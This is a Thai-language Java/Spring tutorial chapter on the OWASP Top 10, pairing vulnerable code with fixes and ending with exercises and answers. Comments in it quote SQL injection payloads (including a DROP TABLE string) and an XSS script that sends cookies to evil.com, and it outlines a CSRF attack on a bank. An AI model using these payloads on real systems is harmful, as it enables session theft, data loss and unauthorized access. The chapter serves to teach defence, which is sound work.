# Part 101: Security Best Practices และ OWASP Top 10

> ขั้นตอนที่ 1001-1010 ของหลักสูตร | ระดับ: ระดับมืออาชีพ/โลก

## สารบัญ

1. OWASP Top 10 คืออะไร ทำไมสำคัญ
2. Injection: SQL Injection และการป้องกัน
3. Broken Authentication: ทบทวนและเสริมความปลอดภัย
4. Sensitive Data Exposure: การเข้ารหัสข้อมูล
5. Broken Access Control: IDOR และการป้องกัน
6. Security Misconfiguration
7. Cross-Site Scripting (XSS)
8. Cross-Site Request Forgery (CSRF)
9. Using Components with Known Vulnerabilities: Dependency Scanning
10. แบบฝึกหัดและสรุป

---

## 1. OWASP Top 10 คืออะไร ทำไมสำคัญ

**OWASP (Open Web Application Security Project)** เป็นองค์กรที่รวบรวม
**10 ช่องโหว่ความปลอดภัยที่พบบ่อยที่สุด**ในเว็บแอปพลิเคชัน — ทบทวน
ตลอดหลักสูตรที่เราพูดถึงความปลอดภัยเป็นระยะ (Part 82, 83, 85, 95, 96,
98) — Part นี้จะรวบรวมและเจาะลึกเป็นระบบตามมาตรฐาน OWASP

```java
public class WhyOwaspMattersDemo {
    /*
     * OWASP Top 10 ไม่ใช่แค่ทฤษฎี - เป็น checklist ที่ทีม security ใช้ตรวจสอบระบบจริง
     * และเป็นพื้นฐานของมาตรฐานความปลอดภัยในอุตสาหกรรม (PCI-DSS, SOC 2 ก็อ้างอิงจากนี้)
     * นักพัฒนาที่เข้าใจ OWASP Top 10 จะเขียนโค้ดที่ปลอดภัยกว่าตั้งแต่ต้น (secure by design)
     * แทนที่จะแก้ไขทีหลังหลังพบช่องโหว่ (ซึ่งมี cost สูงกว่ามาก)
     */
}
```

## 2. Injection: SQL Injection และการป้องกัน

ทบทวนจาก Part 64: การต่อ String SQL ตรง ๆ เป็นอันตรายมาก

```java
public class SqlInjectionVulnerableDemo {
    /*
     * อันตรายมาก - ห้ามทำแบบนี้เด็ดขาด:
     *   String query = "SELECT * FROM users WHERE username = '" + username + "'";
     *
     * ถ้า username = "admin' OR '1'='1"
     *   -> query จริงกลายเป็น: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
     *   -> '1'='1' เป็นจริงเสมอ -> คืนค่า user ทุกคนในระบบ! (bypass authentication ได้ทันที)
     *
     * อันตรายกว่านั้น: username = "x'; DROP TABLE users; --"
     *   -> อาจลบ table ทั้งหมดได้เลยถ้า database driver รัน multiple statement
     */
}
```

```java
import java.sql.PreparedStatement;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;

public class SqlInjectionSafeDemo {
    public boolean authenticateUser(Connection conn, String username, String password) throws SQLException {
        // PreparedStatement (ทบทวน Part 64) ใช้ parameter binding - ค่าที่ผู้ใช้กรอกไม่ถูกตีความเป็น SQL syntax เด็ดขาด
        String query = "SELECT * FROM users WHERE username = ? AND password_hash = ?";
        try (PreparedStatement stmt = conn.prepareStatement(query)) {
            stmt.setString(1, username); // "admin' OR '1'='1" ถูกมองเป็น "ค่าข้อความธรรมดา" เท่านั้น
            stmt.setString(2, password);
            try (ResultSet rs = stmt.executeQuery()) {
                return rs.next();
            }
        }
    }
    // Spring Data JPA (Part 79) ปลอดภัยจาก SQL Injection โดยธรรมชาติเพราะใช้ parameter binding ภายในเสมอ
    // (ยกเว้นถ้าเขียน @Query แบบ native ที่ต่อ string เอง - ต้องระวังเป็นพิเศษ)
}
```

## 3. Broken Authentication: ทบทวนและเสริมความปลอดภัย

ทบทวนจาก Part 82, 83: `BCryptPasswordEncoder`, JWT — เพิ่มมาตรการป้องกัน
เพิ่มเติมที่สำคัญ:

```java
import org.springframework.stereotype.Service;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicInteger;

@Service
public class LoginAttemptService {
    private final ConcurrentHashMap<String, AtomicInteger> attempts = new ConcurrentHashMap<>();
    private static final int MAX_ATTEMPTS = 5;

    public boolean isBlocked(String username) {
        AtomicInteger count = attempts.get(username);
        return count != null && count.get() >= MAX_ATTEMPTS;
        // ป้องกัน Brute Force Attack: จำกัดจำนวนครั้งที่ลอง login ผิดได้ (ทบทวน Rate Limiting จาก Part 85, 93)
    }

    public void recordFailedAttempt(String username) {
        attempts.computeIfAbsent(username, k -> new AtomicInteger(0)).incrementAndGet();
    }

    public void resetAttempts(String username) {
        attempts.remove(username); // reset หลัง login สำเร็จ
    }
    /*
     * เพิ่มเติมที่ควรทำในระบบจริง:
     *   - Multi-Factor Authentication (MFA): เพิ่มชั้นความปลอดภัยนอกจาก password
     *   - Password Policy: บังคับความยาว/ความซับซ้อนขั้นต่ำของ password
     *   - Session Timeout: JWT ควรมีอายุสั้น (ทบทวน Part 83 หัวข้อ 9)
     */
}
```

## 4. Sensitive Data Exposure: การเข้ารหัสข้อมูล

```java
public class DataEncryptionLayersDemo {
    /*
     * Encryption in Transit: ข้อมูลระหว่างเดินทาง (client <-> server) ต้องเข้ารหัสด้วย HTTPS/TLS
     *   (ทบทวนความสำคัญจาก Part 71, 83 หัวข้อ 9) - ไม่มีข้อยกเว้นแม้แต่ internal network
     *
     * Encryption at Rest: ข้อมูลที่เก็บใน database/disk ต้องเข้ารหัสด้วย (เผื่อ disk ถูกขโมยหรือ backup รั่วไหล)
     *   RDS/managed database (ทบทวน Part 98) มักมี option "encryption at rest" เปิดใช้ได้ทันที
     *
     * Hashing (ไม่ใช่ Encryption!): password ต้อง hash ด้วย BCrypt (ทบทวน Part 82) ไม่ใช่ encrypt
     *   เพราะ hash เป็น one-way (ถอดกลับไม่ได้) - encrypt ถอดกลับได้เสมอถ้ามี key ซึ่งไม่เหมาะกับ password
     */
}
```

```java
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import java.security.SecureRandom;

public class FieldLevelEncryptionDemo {
    // สำหรับข้อมูล sensitive มาก (เช่น เลขบัตรประชาชน) อาจต้อง encrypt เฉพาะ field นั้นก่อนเก็บลง database
    public byte[] encryptField(String plainText, SecretKey key) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding"); // AES-GCM ทบทวนความสำคัญของ algorithm ที่แข็งแรง
        byte[] iv = new byte[12];
        new SecureRandom().nextBytes(iv); // ทบทวน SecureRandom จาก Part 82 - ต้องสุ่มจริง ไม่ใช่ Random ธรรมดา
        cipher.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(128, iv));
        return cipher.doFinal(plainText.getBytes());
        // ในระบบจริงควรใช้ KMS (Key Management Service - ทบทวน Part 98) จัดการ key แทนการเก็บ key เองในโค้ด
    }
}
```

## 5. Broken Access Control: IDOR และการป้องกัน

**IDOR (Insecure Direct Object Reference)** เป็นช่องโหว่ที่พบบ่อยมาก —
ผู้ใช้เข้าถึงข้อมูลของคนอื่นได้โดยแค่**เปลี่ยน ID ใน URL**

```java
public class IdorVulnerableDemo {
    /*
     * อันตราย: GET /api/orders/42 คืนข้อมูล order 42 โดยไม่เช็คว่า order นี้เป็นของ user ที่ login อยู่หรือไม่!
     *
     * @GetMapping("/api/orders/{id}")
     * public OrderDto getOrder(@PathVariable Long id) {
     *     return orderRepository.findById(id).map(this::toDto).orElseThrow(); // ไม่เช็ค ownership!
     * }
     *
     * ผู้ใช้ A (login แล้ว) แค่เปลี่ยน URL เป็น /api/orders/43, /api/orders/44, ...
     * ก็เห็นข้อมูล order ของผู้ใช้คนอื่นได้ทั้งหมด (ทบทวนอันตรายที่คล้ายกับ Part 90 หัวข้อ 8 - private messaging)
     */
}
```

```java
import org.springframework.security.core.Authentication;
import org.springframework.web.bind.annotation.*;

@RestController
@RequestMapping("/api/orders")
public class SecureOrderController {
    private final OrderRepository orderRepository;

    public SecureOrderController(OrderRepository orderRepository) { this.orderRepository = orderRepository; }

    @GetMapping("/{id}")
    public OrderDto getOrder(@PathVariable Long id, Authentication authentication) {
        String currentUsername = authentication.getName(); // ทบทวน Authentication จาก Part 82, 83
        Order order = orderRepository.findById(id).orElseThrow(() -> new OrderNotFoundException(id));

        // ตรวจสอบ ownership ทุกครั้งก่อนคืนข้อมูล - หัวใจสำคัญของการป้องกัน IDOR
        if (!order.getCustomerUsername().equals(currentUsername)) {
            throw new AccessDeniedException("You do not have permission to view this order");
            // คืนค่า 403 Forbidden ไม่ใช่ 404 - แต่บางระบบเลือกคืน 404 เพื่อไม่บอกว่า order นี้มีอยู่จริง (defense in depth)
        }
        return toDto(order);
    }

    private OrderDto toDto(Order order) {
        return new OrderDto(order.getId(), order.getStatus(), order.getAmount());
    }
}
```

## 6. Security Misconfiguration

```java
public class SecurityMisconfigurationExamples {
    /*
     * ตัวอย่างการตั้งค่าผิดพลาดที่พบบ่อย:
     *   1. เปิด Actuator endpoint (ทบทวน Part 94, 99) โดยไม่มี authentication -> ใครก็เห็น internal metric/config
     *      management.endpoints.web.exposure.include=* (ผิด - เปิดหมดทุก endpoint รวม /actuator/env ที่มี secret)
     *      ควรจำกัดแค่ endpoint ที่จำเป็น และใส่ authentication (ทบทวน Part 82)
     *
     *   2. แสดง stack trace เต็มรูปแบบให้ client เห็นตอน error (เผยรายละเอียด internal implementation)
     *      ทบทวน @RestControllerAdvice จาก Part 78, 81 - ควรคืน error message ทั่วไป ไม่ใช่ stack trace ดิบ
     *
     *   3. ใช้ default credential ที่ไม่เปลี่ยน (เช่น admin/admin ของ database console, RabbitMQ management UI)
     *
     *   4. CORS ตั้งเป็น "*" (อนุญาตทุก origin) ในระบบ production ที่มีข้อมูล sensitive (ทบทวน Part 71)
     */
}
```

```java
@RestControllerAdvice
public class SecureGlobalExceptionHandler {
    @ExceptionHandler(Exception.class)
    public ResponseEntity<ErrorResponse> handleGenericException(Exception ex) {
        // Log stack trace เต็มรูปแบบฝั่ง server เพื่อ debug (ทบทวน Part 63, 99)
        // แต่คืนข้อความทั่วไปให้ client เท่านั้น - ไม่เผย internal detail ที่อาจถูกใช้โจมตี
        return ResponseEntity.internalServerError()
                .body(new ErrorResponse("An unexpected error occurred", "INTERNAL_ERROR"));
    }
    record ErrorResponse(String message, String code) {}
}
```

## 7. Cross-Site Scripting (XSS)

```java
public class XssVulnerableDemo {
    /*
     * อันตราย: แสดงข้อมูลที่ผู้ใช้กรอกกลับไปที่หน้าเว็บโดยไม่ escape
     *   ผู้ใช้กรอก comment: "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"
     *   ถ้าเว็บแสดง comment นี้กลับไปโดยตรงใน HTML -> script ทำงานจริงในเบราว์เซอร์ของผู้ใช้คนอื่นที่มาดู
     *   -> ขโมย cookie/session ของผู้ใช้คนอื่นไปใช้ปลอมตัวได้ (session hijacking)
     */
}
```

```java
import org.springframework.web.util.HtmlUtils;

public class XssPreventionDemo {
    public String sanitizeUserInput(String userComment) {
        // escape ตัวอักษรพิเศษ (<, >, &, ", ') ก่อนแสดงผลใน HTML - ทำให้ script tag ไม่ถูกตีความเป็น code
        return HtmlUtils.htmlEscape(userComment);
        // "<script>...</script>" กลายเป็น "&lt;script&gt;...&lt;/script&gt;" - แสดงเป็นข้อความธรรมดา ไม่รันจริง
    }
    /*
     * Framework สมัยใหม่ (React, Vue, Thymeleaf) escape ค่าให้อัตโนมัติโดย default อยู่แล้ว
     * อันตรายที่สุดคือการใช้ dangerouslySetInnerHTML (React) หรือ th:utext (Thymeleaf) ที่ปิดการ escape
     * โดยตั้งใจ - ต้องมั่นใจ 100% ว่าข้อมูลนั้นปลอดภัยก่อนใช้ (เช่น มาจาก admin ที่เชื่อถือได้เท่านั้น)
     */
}
```

## 8. Cross-Site Request Forgery (CSRF)

ทบทวนจาก Part 82 หัวข้อที่กล่าวถึง CSRF สั้น ๆ — ขยายความที่นี่:

```java
public class CsrfAttackScenarioDemo {
    /*
     * สถานการณ์การโจมตี:
     *   1. ผู้ใช้ login เข้า bank.com (browser เก็บ session cookie ไว้)
     *   2. ผู้ใช้เปิดเว็บ evil.com ในแท็บอื่น (โดยไม่รู้ว่าเป็นเว็บอันตราย)
     *   3. evil.com มี form ที่ submit ไปที่ bank.com/transfer?to=attacker&amount=10000 โดยอัตโนมัติ
     *   4. Browser แนบ session cookie ของ bank.com ไปด้วย (เพราะเป็น cookie ของ domain นั้น) -> request สำเร็จ!
     *   5. เงินถูกโอนออกจากบัญชีผู้ใช้โดยที่ผู้ใช้ไม่ได้ตั้งใจทำอะไรเลย
     */
}
```

```java
public class CsrfProtectionExplanation {
    /*
     * ทบทวนจาก Part 83: ระบบที่ใช้ JWT ผ่าน Authorization header (ไม่ใช่ cookie) ปลอดภัยจาก CSRF
     * โดยธรรมชาติ เพราะ evil.com ไม่สามารถอ่านหรือแนบ JWT ที่เก็บใน localStorage/memory ของ bank.com ได้
     * (นี่คือเหตุผลหนึ่งที่ Part 83 ตั้งค่า .csrf(csrf -> csrf.disable()) เมื่อใช้ JWT)
     *
     * แต่ถ้าระบบยังใช้ session cookie แบบดั้งเดิม (ทบทวน Part 71) ต้องมี CSRF Token:
     *   Server สร้าง token สุ่มฝัง form ไว้ - evil.com ไม่รู้ค่า token นี้ (ไม่สามารถอ่าน response ของ bank.com ได้
     *   เพราะ Same-Origin Policy) - request ที่ไม่มี token ที่ถูกต้องจะถูกปฏิเสธ
     */
}
```

## 9. Using Components with Known Vulnerabilities: Dependency Scanning

ทบทวนจาก Part 61, 62: Maven/Gradle ใช้ **dependency จากภายนอกจำนวนมาก**
— แต่ dependency เหล่านี้**อาจมีช่องโหว่ที่ถูกค้นพบทีหลัง**

```xml
<!-- pom.xml -->
<plugin>
    <groupId>org.owasp</groupId>
    <artifactId>dependency-check-maven</artifactId>
    <version>9.0.9</version>
    <executions>
        <execution>
            <goals>
                <goal>check</goal>
            </goals>
        </execution>
    </executions>
</plugin>
```

```java
public class DependencyScanningInPipeline {
    /*
     * เพิ่ม step ใน CI Pipeline (ทบทวน Part 97): mvn org.owasp:dependency-check-maven:check
     *
     * Tool นี้เช็ค dependency ทุกตัวใน pom.xml เทียบกับ CVE database (Common Vulnerabilities and Exposures)
     * ถ้าพบ dependency ที่มีช่องโหว่ที่รู้จัก (เช่น Log4Shell - ช่องโหว่ร้ายแรงใน Log4j เมื่อปี 2021)
     * -> pipeline fail ทันที บอกให้ทีมอัปเดต dependency นั้นเป็นเวอร์ชันที่แพตช์แล้วก่อน deploy
     *
     * นี่คือเหตุผลสำคัญที่ต้อง "อัปเดต dependency เป็นระยะ" ไม่ปล่อยให้เก่าค้างนานเกินไป
     * (แต่ก็ต้องทดสอบให้ดีก่อน - อัปเดต major version อาจมี breaking change)
     */
}
```

## 10. แบบฝึกหัดและสรุป

### แบบฝึกหัด

**1)** แก้ไขโค้ดต่อไปนี้ให้ปลอดภัยจาก SQL Injection

```java
public class VulnerableSearchService {
    public List<Product> searchByName(Connection conn, String name) throws SQLException {
        String query = "SELECT * FROM products WHERE name LIKE '%" + name + "%'";
        // ...
        return null;
    }
}
```

**เฉลย:**
```java
public class SafeSearchService {
    public List<Product> searchByName(Connection conn, String name) throws SQLException {
        String query = "SELECT * FROM products WHERE name LIKE ?";
        try (PreparedStatement stmt = conn.prepareStatement(query)) {
            stmt.setString(1, "%" + name + "%"); // ประกอบ wildcard ไว้ในค่าพารามิเตอร์ ไม่ใช่ใน SQL string
            // ... execute และ map ผลลัพธ์
        }
        return null;
    }
}
```

**2)** อธิบายว่าทำไม IDOR (Insecure Direct Object Reference) เป็นช่องโหว่
ที่ "ตรวจจับยาก" กว่า SQL Injection ในกระบวนการ code review ทั่วไป

**เฉลย**: **SQL Injection** (หัวข้อ 2) มี **pattern ที่ตรวจจับได้ชัดเจน**
ในระดับโค้ด — reviewer หรือ static analysis tool สามารถ**มองหาการต่อ
String เข้ากับ SQL query ตรง ๆ** ได้ง่าย (เช่น `"SELECT * FROM ... " +
variable`) ซึ่งเป็นสัญญาณอันตรายที่ชัดเจน ในขณะที่ **IDOR** (หัวข้อ 5)
**โค้ดดูเหมือนทำงานถูกต้องสมบูรณ์แบบ**ในทุกกรณีทดสอบปกติ (query
database, คืนข้อมูล, ไม่มี syntax error หรือ pattern อันตรายใด ๆ ให้
สังเกต) — ปัญหาอยู่ที่**การขาดหายไปของ logic การตรวจสอบสิทธิ์**
(ownership check) ซึ่ง**ไม่มีอะไรผิดปกติให้เห็นในโค้ดที่เขียนไว้** มีแต่
**สิ่งที่ "ไม่ได้เขียน" เท่านั้น** (การเช็คว่า resource นี้เป็นของผู้ใช้
คนที่ request มาหรือไม่) reviewer ต้อง**คิดในมุมของผู้โจมตี** ("จะเกิด
อะไรถ้าฉันเปลี่ยน ID นี้เป็นค่าอื่น") อย่างจงใจถึงจะพบปัญหานี้ ต่างจาก
SQL Injection ที่มี syntax pattern ที่ตรวจจับได้แม้ไม่ได้คิดในมุม
ผู้โจมตีเลย

**3)** อธิบายว่าทำไมระบบที่ใช้ JWT ผ่าน `Authorization` header (ทบทวน
Part 83) มักไม่ต้องกังวลเรื่อง CSRF มากเท่าระบบที่ใช้ session cookie
แบบดั้งเดิม

**เฉลย**: CSRF (หัวข้อ 8) โจมตีได้สำเร็จเพราะ**browser แนบ cookie ของ
domain ปลายทางไปกับ request โดยอัตโนมัติ**เสมอ ไม่ว่า request นั้นจะถูก
สร้างจากหน้าเว็บใดก็ตาม (แม้จะเป็น evil.com ก็ตาม) — ผู้โจมตี**ไม่ต้องรู้
ค่า cookie เลย** เพียงแค่หลอกให้ browser ของเหยื่อส่ง request ไปที่
domain ที่มี session cookie อยู่ก็เพียงพอ ในขณะที่ระบบที่ใช้ **JWT ผ่าน
`Authorization` header**นั้น **ต้องเขียนโค้ด JavaScript แนบ header นี้
เข้าไปกับ request เองอย่างชัดเจนเสมอ**(ทบทวน Part 83 หัวข้อ 6 -
`JwtAuthenticationFilter` อ่านจาก header ไม่ใช่จาก cookie) — evil.com
**ไม่มีทางรู้หรืออ่านค่า JWT ที่เก็บไว้ใน localStorage/memory ของ
bank.com ได้เลย** เพราะถูกป้องกันด้วย **Same-Origin Policy** ของ browser
ทำให้ evil.com ไม่สามารถสร้าง request ที่มี JWT ที่ถูกต้องแนบไปด้วยได้
นี่คือเหตุผลที่ Part 83 ปิดการใช้งาน CSRF protection ของ Spring Security
เมื่อระบบใช้ JWT (เพราะความเสี่ยงจาก CSRF ลดลงอย่างมากโดยธรรมชาติของ
สถาปัตยกรรมนี้เอง)

### สรุปเนื้อหา Part 101

- OWASP Top 10 เป็นมาตรฐานอุตสาหกรรมสำหรับช่องโหว่ความปลอดภัยที่พบบ่อย
  ที่สุดในเว็บแอปพลิเคชัน
- SQL Injection ป้องกันได้ด้วย PreparedStatement/parameter binding เสมอ
  ห้ามต่อ String SQL ตรง ๆ
- Broken Authentication ป้องกันเพิ่มด้วย rate limiting การพยายาม login,
  MFA, session timeout ที่เหมาะสม
- ข้อมูล sensitive ต้อง encrypt in transit (HTTPS) และ at rest; password
  ต้อง hash ไม่ใช่ encrypt
- IDOR ป้องกันด้วยการตรวจสอบ ownership ทุกครั้งก่อนคืนข้อมูล ไม่ใช่แค่
  authentication อย่างเดียว
- Security Misconfiguration เกิดจากการเปิด endpoint/feature ที่ไม่ควร
  เปิดในระบบ production
- XSS ป้องกันด้วยการ escape ข้อมูลที่ผู้ใช้กรอกก่อนแสดงผลใน HTML เสมอ
- CSRF อันตรายกับระบบที่ใช้ cookie-based session; JWT ผ่าน header
  ปลอดภัยกว่าโดยธรรมชาติ
- Dependency Scanning ใน CI Pipeline ตรวจจับ library ที่มีช่องโหว่ที่
  รู้จักก่อน deploy

**ต่อไป**: [Part 102 — Advanced Concurrency และ Reactive Programming](./part-102-reactive-programming.md)
